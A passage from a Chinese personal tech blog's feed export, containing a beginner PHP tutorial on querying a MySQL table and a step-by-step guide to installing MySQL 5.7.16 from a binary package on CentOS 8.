<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//第一步确认数据库的位置，用户名，密码，位置，ip地址或者网址,后面or die是前面发生错误就会触发后面提示</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;10.71.10.25&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;Asimov&#x27;</span>) or die(<span class="string">&#x27;链接mysql数据库服务器失败&#x27;</span>);</span><br><span class="line">//选择要操作的数据库</span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">//设置数据库的编码格式</span><br><span class="line">mysqli_query(<span class="variable">$conn</span>,<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line">var_dump(<span class="variable">$conn</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>返回这个说明连接成功</strong></p>
<p><img src="/2022/03/28/PHP-Study/image-20230328153359251.png" alt="image-20230328153359251"></p>
<p><strong>返回这个说明数据库连接失败，可能是ip错了</strong></p>
<p><img src="/2022/03/28/PHP-Study/image-20230328153537406.png" alt="image-20230328153537406"></p>
<p><strong>返回这个说明是数据库账号错了</strong></p>
<p><img src="/2022/03/28/PHP-Study/image-20230328153756724.png" alt="image-20230328153756724"></p>
<p><strong>返回这个说明是数据库密码错了</strong></p>
<p><img src="/2022/03/28/PHP-Study/image-20230328153829750.png" alt="image-20230328153829750"></p>
<p><strong>接下来开始连接数据库然后打印数据库表内容</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//第一步确认数据库的位置，用户名，密码，位置，ip地址或者网址,后面or die是前面发生错误就会触发后面提示</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;10.71.10.25&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;Asimov&#x27;</span>) or die(<span class="string">&#x27;链接mysql数据库服务器失败&#x27;</span>);</span><br><span class="line">//选择要操作的数据库</span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">//设置数据库的编码格式</span><br><span class="line">mysqli_query(<span class="variable">$conn</span>,<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line">// 执行SQL语句,这里是意思是把整张test02表格输出</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM test02&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">var_dump(<span class="variable">$result</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p>*<em>看到这个说明我们执行成功，后面int(4)说我们有4条记录，我们数据表确实有4条记录，那么为啥没有具体是查询出来捏<del>(￣▽￣)</del><em>，我们得转换一下将执行结果转换成为结果集</em></em></p>
<p><img src="/2022/03/28/PHP-Study/image-20230328154327099.png" alt="image-20230328154327099"></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//第一步确认数据库的位置，用户名，密码，位置，ip地址或者网址,后面or die是前面发生错误就会触发后面提示</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;10.71.10.25&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;Asimov&#x27;</span>) or die(<span class="string">&#x27;链接mysql数据库服务器失败&#x27;</span>);</span><br><span class="line">//选择要操作的数据库</span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">//设置数据库的编码格式</span><br><span class="line">mysqli_query(<span class="variable">$conn</span>,<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line">// 执行SQL语句,这里是意思是把整张test02表格输出</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM test02&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line"><span class="variable">$data</span> = mysqli_fetch_assoc(<span class="variable">$result</span>);</span><br><span class="line">var_dump(<span class="variable">$data</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>下面这个则是输出值:(你会发现，为啥我四行的数据表只输出了一行)</strong></p>
<p><img src="/2022/03/28/PHP-Study/image-20230328155530623.png" alt="image-20230328155530623"></p>
<p><strong>这个时候，我们使用循环遍历，把一个个数据表遍历出来</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//第一步确认数据库的位置，用户名，密码，位置，ip地址或者网址,后面or die是前面发生错误就会触发后面提示</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;10.71.10.25&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;Asimov&#x27;</span>) or die(<span class="string">&#x27;链接mysql数据库服务器失败&#x27;</span>);</span><br><span class="line">//选择要操作的数据库</span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">//设置数据库的编码格式</span><br><span class="line">mysqli_query(<span class="variable">$conn</span>,<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line">//var_dump(<span class="variable">$conn</span>);</span><br><span class="line">// 执行SQL语句</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM test02&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">// 将执行结果转换成为结果集</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$data</span> = mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">	var_dump(<span class="variable">$data</span>);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/28/PHP-Study/image-20230328161200638.png" alt="image-20230328161200638"></p>
<p><strong>数据都遍历出来了，但是很密集，我这给它空几行</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//第一步确认数据库的位置，用户名，密码，位置，ip地址或者网址,后面or die是前面发生错误就会触发后面提示</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;10.71.10.25&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;Asimov&#x27;</span>) or die(<span class="string">&#x27;链接mysql数据库服务器失败&#x27;</span>);</span><br><span class="line">//选择要操作的数据库</span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">//设置数据库的编码格式</span><br><span class="line">mysqli_query(<span class="variable">$conn</span>,<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line">//var_dump(<span class="variable">$conn</span>);</span><br><span class="line">// 执行SQL语句</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM test02&quot;</span>;</span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">// 将执行结果转换成为结果集</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$data</span> = mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">    var_dump(<span class="variable">$data</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><strong>这样看就舒服多了，是不是捏<del>(￣▽￣)</del></strong>*</p>
<p><img src="/2022/03/28/PHP-Study/image-20230328161509400.png" alt="image-20230328161509400"></p>
<p><strong>如果我需要它的名字怎么办？</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//第一步确认数据库的位置，用户名，密码，位置，ip地址或者网址,后面or die是前面发生错误就会触发后面提示</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;10.71.10.25&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;Asimov&#x27;</span>) or die(<span class="string">&#x27;链接mysql数据库服务器失败&#x27;</span>);</span><br><span class="line">//选择要操作的数据库</span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">//设置数据库的编码格式</span><br><span class="line">mysqli_query(<span class="variable">$conn</span>,<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line">//var_dump(<span class="variable">$conn</span>);</span><br><span class="line">// 执行SQL语句</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT name FROM test02&quot;</span>;       <span class="comment">#这里把*改name</span></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">// 将执行结果转换成为结果集</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$data</span> = mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">    var_dump(<span class="variable">$data</span>);</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/28/PHP-Study/image-20230328161904981.png" alt="image-20230328161904981"></p>
<p><strong>但是，还是不够简洁，那么可以改成这样</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">//第一步确认数据库的位置，用户名，密码，位置，ip地址或者网址,后面or die是前面发生错误就会触发后面提示</span><br><span class="line"><span class="variable">$conn</span> = mysqli_connect(<span class="string">&#x27;10.71.10.25&#x27;</span>,<span class="string">&#x27;root&#x27;</span>,<span class="string">&#x27;Asimov&#x27;</span>) or die(<span class="string">&#x27;链接mysql数据库服务器失败&#x27;</span>);</span><br><span class="line">//选择要操作的数据库</span><br><span class="line">mysqli_select_db(<span class="variable">$conn</span>,<span class="string">&#x27;test&#x27;</span>);</span><br><span class="line">//设置数据库的编码格式</span><br><span class="line">mysqli_query(<span class="variable">$conn</span>,<span class="string">&#x27;set names utf8&#x27;</span>);</span><br><span class="line">//var_dump(<span class="variable">$conn</span>);</span><br><span class="line">// 执行SQL语句</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;SELECT * FROM test02&quot;</span>;       <span class="comment">#这里把name改*也可以</span></span><br><span class="line"><span class="variable">$result</span> = mysqli_query(<span class="variable">$conn</span>,<span class="variable">$sql</span>);</span><br><span class="line">// 将执行结果转换成为结果集</span><br><span class="line"><span class="keyword">while</span>(<span class="variable">$data</span> = mysqli_fetch_assoc(<span class="variable">$result</span>))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="variable">$data</span>[<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/03/28/PHP-Study/image-20230328162301304.png" alt="image-20230328162301304"></p>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
      <tags>
        <tag>前端</tag>
        <tag>PHP</tag>
      </tags>
  </entry>
  <entry>
    <title>MYSQL_5.7.16_install</title>
    <url>/2022/07/19/MYSQL-5-7-16-install/</url>
    <content><![CDATA[<p>[toc]</p>
<h1 id="一-MYSQL"><a href="#一-MYSQL" class="headerlink" title="一.MYSQL"></a>一.MYSQL</h1><h3 id="1-MYSQL简介"><a href="#1-MYSQL简介" class="headerlink" title="1.MYSQL简介"></a><strong>1.MYSQL简介</strong></h3><p>​		MYSQL 是一种开源的关系型数据库产品，具有开放式的架构。MYSQL最初由瑞典MYSQL AB 公司研发，后被SUN 公司收购，最后被Oracle公司收购。</p>
<p>​		MYSQL 数据库是传统的关系型数据库，其开放式的架构使得用户有更多的选择。当下大多数互联网公司也比较热衷选择开源代码架构的产品。MYSQL 数据库在不断的更新和迭代发展，其功能也越来越强大，性能越爱越好，支持的平台越来越广。在实际工作中，MYSQL也是使用最多的是数据库。</p>
<h3 id="2-MYSQL版本"><a href="#2-MYSQL版本" class="headerlink" title="2.MYSQL版本"></a><strong>2.MYSQL版本</strong></h3><p>​		MYSQL有众多版本，如下所示：</p>
<p>(1)Alpha版本：一般在软件开发公司内部运行，不对外公开。</p>
<p>(2)Beta版本：完成功能开发和所有测试工作后的产品，不会存在较大的功能或者性能Bug。</p>
<p>(3)PC版本：属于正式发布前的一个版本，也是最终测试版本，进一步收集Bug或者不足之处，然后进行修复和完善。</p>
<p>(4)GA版本：软件产品正式发布的版本，也是生产环境使用的版本。</p>
<h3 id="3-MYSQL的安装方式"><a href="#3-MYSQL的安装方式" class="headerlink" title="3.MYSQL的安装方式"></a><strong>3.MYSQL的安装方式</strong></h3><p>（1）常见的编译安装方式（适用于MYSQL 5.5前的版本）。</p>
<p>（2）二进制包安装的方式。</p>
<p>（3）RPM包的安装方式。</p>
<p>（4）Cmake方式安装（适用于MYSQL 5.5后的版本）。</p>
<h1 id="二-MYSQL-的安装与部署（本次部署是在Centos8上面部署的，安装包和命令都是成功后的复制品，不存在失败）"><a href="#二-MYSQL-的安装与部署（本次部署是在Centos8上面部署的，安装包和命令都是成功后的复制品，不存在失败）" class="headerlink" title="二.MYSQL 的安装与部署（本次部署是在Centos8上面部署的，安装包和命令都是成功后的复制品，不存在失败）"></a><strong>二.MYSQL 的安装与部署</strong>（本次部署是在Centos8上面部署的，安装包和命令都是成功后的复制品，不存在失败）</h1><h3 id="1-MYSQL安装包的下载网站"><a href="#1-MYSQL安装包的下载网站" class="headerlink" title="1.MYSQL安装包的下载网站"></a><strong>1.MYSQL安装包的下载网站</strong></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://downloads.mysql.com/archives/community/</span><br></pre></td></tr></table></figure>

<p>在里面下载一个Linux的 <strong>mysql-5.7.16-linux-glibc2.5-x86_64.tar.gz</strong> 二进制安装包</p>
<h3 id="2-安装依赖包软件"><a href="#2-安装依赖包软件" class="headerlink" title="2.安装依赖包软件"></a><strong>2.安装依赖包软件</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin ~]<span class="comment"># yum -y install zlib-devel gcc-c++ ncurses ncurses-devel libaio libaio-devel libncurses*</span></span><br></pre></td></tr></table></figure>

<h3 id="3-用xshell上传-mysql-5-7-16-linux-glibc2-5-x86-64-tar-gz到服务器上"><a href="#3-用xshell上传-mysql-5-7-16-linux-glibc2-5-x86-64-tar-gz到服务器上" class="headerlink" title="*3.用xshell上传 mysql-5.7.16-linux-glibc2.5-x86_64.tar.gz到服务器上*"></a>*<em>3.用xshell上传 <em>mysql-5.7.16-linux-glibc2.5-x86_64.tar.gz</em>到服务器上</em>*</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin ~]<span class="comment"># yum -y install lrzsz     #安装lrzsz 方便两设备上传下载东西</span></span><br></pre></td></tr></table></figure>




<p><img src="/2022/07/19/MYSQL-5-7-16-install/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(25).png"></p>
<p>安装好 <strong>lrzsz</strong> 后即可时使用 <strong>rz</strong> 命令上传文件到服务器，使用 <strong>sz</strong> 命令下载文件到客户端</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin ~]<span class="comment"># rz</span></span><br></pre></td></tr></table></figure>



<p><img src="/2022/07/19/MYSQL-5-7-16-install/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(26).png"></p>
<p><img src="/2022/07/19/MYSQL-5-7-16-install/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(27).png"></p>
<p>上传完成后可以用 <strong>ls</strong> 命令来看到 <strong>mysql-5.7.16-linux-glibc2.5-x86_64.tar.gz</strong> 二进制安装包</p>
<p><img src="/2022/07/19/MYSQL-5-7-16-install/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(28).png"></p>
<h3 id="4-安装MYSQL"><a href="#4-安装MYSQL" class="headerlink" title="4.安装MYSQL"></a><strong>4.安装MYSQL</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin ~]<span class="comment"># useradd mysql -s /sbin/nologin -M      #创建一个mysql的账号，并且定义它不能登录shell，-M参数：不要自动建立用户的主目录（意味这mysql这个用户没有家）</span></span><br><span class="line">[root@kejulin ~]<span class="comment"># mkdir -p /mysql/data           #创建一个递归目录，-p参数：没有的目录自动创建</span></span><br><span class="line">[root@kejulin ~]<span class="comment"># chown -R mysql.mysql /mysql/   #递归更改目录的属主和属组为mysql，-R参数：递归地更改指定文件夹的所有权，但不更改链接指向目录</span></span><br><span class="line">[root@kejulin ~]<span class="comment"># tar zxf mysql-5.7.16-linux-glibc2.5-x86_64.tar.gz -C /usr/local/     #指定解压 mysql-5.7.16-linux-glibc2.5-x86_64.tar.gz 到/usr/local/ 目录下</span></span><br><span class="line">[root@kejulin ~]<span class="comment"># ln -s /usr/local/mysql-5.7.16-linux-glibc2.5-x86_64 /usr/local/mysql    #说真的。。。看到这个我tm笑死，建立软连接干嘛，怕那么点字母？</span></span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin mysql]<span class="comment"># cd /usr/local/mysql/      </span></span><br><span class="line">[root@kejulin mysql]<span class="comment"># cp support-files/my-default.cnf /etc/my.cnf    #修改/etc/my.cnf 里面的数据就好，my-default.cnf 这个压根不用管。。。配置文件都转移到/etc/目录下面了</span></span><br><span class="line">[root@kejulin mysql]<span class="comment"># cp support-files/mysql.server /etc/init.d/mysqld</span></span><br><span class="line"><span class="comment"># init.d目录包含许多系统各种服务的启动和停止脚本(/etc/init.d里的shell脚本能够响应start，stop，restart，reload命令来管理某个具体的应用)。</span></span><br><span class="line">[root@kejulin mysql]<span class="comment"># chmod +x /etc/init.d/mysqld    #添加执行权限，x参数：执行权限</span></span><br></pre></td></tr></table></figure>

<h3 id="5-MYSQL初始化"><a href="#5-MYSQL初始化" class="headerlink" title="5.MYSQL初始化"></a><strong>5.MYSQL初始化</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin mysql]<span class="comment"># ./bin/mysqld --initialize --basedir=/usr/local/mysql --datadir=/mysql/data/ --user=mysql      #初始化并且规定服务安装目录、	MYSQL服务数据存储目录、规定使用者是 mysql</span></span><br></pre></td></tr></table></figure>

<p>初始化完成后会出现一段密码，把它保存下来，后面登录数据库需要用到它</p>
<p><img src="/2022/07/19/MYSQL-5-7-16-install/%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE(29)_%E7%88%B1%E5%A5%87%E8%89%BA.jpg"></p>
<p>后面这样一串就是密码： <strong>&gt;rqiYpmT9Sh_</strong>   (注意：这里别把空格弄进去了，空格在密码也算一个位置的，密码是自动生成的，每台设备都不一样，别抄我的密码进去了，这样都弄错。。。小心我锤爆你狗头doge）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin mysql]<span class="comment"># egrep -v &quot;^#|^$&quot; /etc/my.cnf    #其实刚刚看到这串鬼东西的时候，我人都傻了，我只学过grep这个命令，egrep这是什么鬼东西，后来从度娘那边查到egrep == grep -e ，秒懂！！！（废话一堆，这句话意思就是，过滤掉 my.cnf 文本里面的注释和空格，剩下的东西全部显现在屏幕上）</span></span><br></pre></td></tr></table></figure>

<p>可以看出<strong>my.cnf</strong> 里面就两行配置信息</p>
<p>那么我们直接进去加点料，定义一些配置信息，让我们装逼装的更加彻底</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin mysql]<span class="comment"># vim /etc/my.cnf</span></span><br></pre></td></tr></table></figure>

<p>进去就会看到这样的 <strong>冥场面</strong> </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># For advice on how to change settings please see</span></span><br><span class="line"><span class="comment"># http://dev.mysql.com/doc/refman/5.7/en/server-configuration-defaults.html</span></span><br><span class="line"><span class="comment"># *** DO NOT EDIT THIS FILE. It&#x27;s a template which will be copied to the</span></span><br><span class="line"><span class="comment"># *** default location during install, and will be replaced if you</span></span><br><span class="line"><span class="comment"># *** upgrade to a newer version of MySQL.</span></span><br><span class="line"></span><br><span class="line">[mysqld]</span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove leading # and set to the amount of RAM for the most important data</span></span><br><span class="line"><span class="comment"># cache in MySQL. Start at 70% of total RAM for dedicated server, else 10%.</span></span><br><span class="line"><span class="comment"># innodb_buffer_pool_size = 128M</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove leading # to turn on a very important data integrity option: logging</span></span><br><span class="line"><span class="comment"># changes to the binary log between backups.</span></span><br><span class="line"><span class="comment"># log_bin</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># These are commonly set, remove the # and set as required.</span></span><br><span class="line"><span class="comment"># basedir = .....</span></span><br><span class="line"><span class="comment"># datadir = .....</span></span><br><span class="line"><span class="comment"># port = .....</span></span><br><span class="line"><span class="comment"># server_id = .....</span></span><br><span class="line"><span class="comment"># socket = .....</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Remove leading # to set options mainly useful for reporting servers.</span></span><br><span class="line"><span class="comment"># The server defaults are faster for transactions and fast SELECTs.</span></span><br><span class="line"><span class="comment"># Adjust sizes as needed, experiment to find the optimal values.</span></span><br><span class="line"><span class="comment"># join_buffer_size = 128M</span></span><br><span class="line"><span class="comment"># sort_buffer_size = 2M</span></span><br><span class="line"><span class="comment"># read_rnd_buffer_size = 2M </span></span><br><span class="line"></span><br><span class="line">sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br><span class="line">~                                                                                                                                                                          </span><br><span class="line">~ </span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p><strong>对于我这个英语小白来说简直绝望</strong></p>
<p><strong>在里面写入这段配置信息，注意不要重复了</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[client]</span><br><span class="line">port = 3306</span><br><span class="line">socket = /mysql/mysql.sock</span><br><span class="line">[mysqld]</span><br><span class="line">basedir = /usr/local/mysql</span><br><span class="line">datadir = /mysql/data/</span><br><span class="line">port = 3306</span><br><span class="line">server_id = 1</span><br><span class="line">socket = /mysql/mysql.sock</span><br><span class="line">sql_mode=NO_ENGINE_SUBSTITUTION,STRICT_TRANS_TABLES</span><br><span class="line">[mysqld_safe]</span><br><span class="line">log-error = /mysql/mysql.log</span><br><span class="line">pid-file = /mysql/mysql.pid</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="6-开启MYSQL服务"><a href="#6-开启MYSQL服务" class="headerlink" title="6.开启MYSQL服务"></a><strong>6.开启MYSQL服务</strong></h3><p>开启这个服务之后，然后就能看到唯一看得懂的英文 <strong>SUCCESS</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin mysql]<span class="comment"># /etc/init.d/mysqld start</span></span><br><span class="line">Starting MySQL.. SUCCESS! </span><br></pre></td></tr></table></figure>

<p>可以使用这段代码来监听端口</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin mysql]<span class="comment"># lsof -i :3306</span></span><br><span class="line">COMMAND   PID  USER   FD   TYPE DEVICE SIZE/OFF NODE NAME</span><br><span class="line">mysqld  11932 mysql   23u  IPv6 150481      0t0  TCP *:mysql (LISTEN)</span><br></pre></td></tr></table></figure>



<h3 id="7-配置环境变量"><a href="#7-配置环境变量" class="headerlink" title="7.配置环境变量"></a><strong>7.配置环境变量</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin mysql]<span class="comment"># echo &#x27;export PATH=$PATH:/usr/local/mysql/bin&#x27; &gt;&gt; /etc/profile</span></span><br><span class="line">[root@kejulin mysql]<span class="comment"># source /etc/profile</span></span><br></pre></td></tr></table></figure>



<h3 id="8-登录数据库"><a href="#8-登录数据库" class="headerlink" title="8.登录数据库"></a><strong>8.登录数据库</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">[root@kejulin ~]<span class="comment"># mysql -uroot -p      </span></span><br><span class="line">Enter password:     <span class="comment">#别告诉我你没有保存密码哦，小心狗头！！！</span></span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 2</span><br><span class="line">Server version: 5.7.16</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line">mysql&gt; </span><br><span class="line">mysql&gt; </span><br></pre></td></tr></table></figure>

<h3 id="9-修改密码"><a href="#9-修改密码" class="headerlink" title="9.修改密码"></a><strong>9.修改密码</strong></h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql&gt; ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;1234567890&#x27;</span>;    <span class="comment">#密码改成1234567890</span></span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt; flush privileges;</span><br><span class="line">Query OK, 0 rows affected (0.00 sec)</span><br><span class="line">mysql&gt; <span class="built_in">exit</span>       <span class="comment">#退出数据库</span></span><br><span class="line">Bye</span><br><span class="line">[root@kejulin ~]<span class="comment">#</span></span><br><span class="line">[root@kejulin ~]<span class="comment"># mysql -uroot -p1234567890</span></span><br><span class="line">mysql: [Warning] Using a password on the <span class="built_in">command</span> line interface can be insecure.</span><br><span class="line">Welcome to the MySQL monitor.  Commands end with ; or \g.</span><br><span class="line">Your MySQL connection <span class="built_in">id</span> is 3</span><br><span class="line">Server version: 5.7.16 MySQL Community Server (GPL)</span><br><span class="line"></span><br><span class="line">Copyright (c) 2000, 2016, Oracle and/or its affiliates. All rights reserved.</span><br><span class="line"></span><br><span class="line">Oracle is a registered trademark of Oracle Corporation and/or its</span><br><span class="line">affiliates. Other names may be trademarks of their respective</span><br><span class="line">owners.</span><br><span class="line"></span><br><span class="line">Type <span class="string">&#x27;help;&#x27;</span> or <span class="string">&#x27;\h&#x27;</span> <span class="keyword">for</span> <span class="built_in">help</span>. Type <span class="string">&#x27;\c&#x27;</span> to clear the current input statement.</span><br><span class="line"></span><br><span class="line">mysql&gt; </span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="三-结尾"><a href="#三-结尾" class="headerlink" title="三.结尾"></a><strong>三.结尾</strong></h1><p>虽然，CSDN 和 百度 等搜索工具里面查到的MYSQL很坑，但是作为一个先行者，我可以很负责任的说能善于用任何工具来解决自己问题对于日后的排错非常有帮助。</p>
<p><img src="/2022/07/19/MYSQL-5-7-16-install/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20210614171041.png"></p>
<p>遇到的困难都可以自己尝试去解决的。</p>
]]></content>
      <categories>
        <category>数据库</category>
      </categories>
      <tags>
        <tag>数据库</tag>
        <tag>MYSQL</tag>
      </tags>
  </entry>
  <entry>
    <title>PicoW</title>
    <url>/2023/05/28/PicoW/</url>
    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉，这个密码看着不太对，请再试试。" data-whm="抱歉，这个文章不能被纠正，不过您还是能看看解密后的内容。">
  <script id="hbeData" type="hbeData" data-hmacdigest="ae0152e95c6fb03265ca57c5fcc0704e416f7dd40ab1baca6bffd62f46b64237"></script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好，这里需要密码。</span>
      </label>
    </div>
  </div>
</div>
<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>娱乐单片机</category>
      </categories>
      <tags>
        <tag>树莓派</tag>
        <tag>单片机</tag>
      </tags>
  </entry>
  <entry>
    <title>Raspberry玩法和心得</title>
    <url>/2022/11/23/Raspberry%E7%8E%A9%E6%B3%95%E5%92%8C%E5%BF%83%E5%BE%97/</url>
    <content><![CDATA[<p>[toc]</p>
